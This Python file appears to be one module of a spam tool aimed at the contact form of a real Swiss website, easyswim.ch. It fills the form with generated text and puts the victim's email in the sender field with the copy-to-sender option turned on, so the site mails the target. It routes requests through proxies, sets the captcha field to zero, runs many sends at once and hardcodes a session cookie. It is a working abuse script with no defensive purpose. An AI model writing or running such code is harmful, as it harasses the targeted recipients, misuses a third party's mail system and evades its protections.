from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '8cfc1a56ec6d7f1e1d161bec544a21c4',
}

headers = {
    'authority': 'easyswim.ch',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://easyswim.ch',
    'pragma': 'no-cache',
    'referer': 'https://easyswim.ch/contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'email': target,
            'subject': self.get_text(),
            'message': self.get_text(),
            'copy_send': [
                '0',
                '1',
            ],
            'formId': 'formSend1',
            'captchaActualCount': '0',
            'formSend': '1',
        }

        response = requests.post('https://easyswim.ch/contact', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies())
        return response


def main():
    s = '{"ok":1}'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
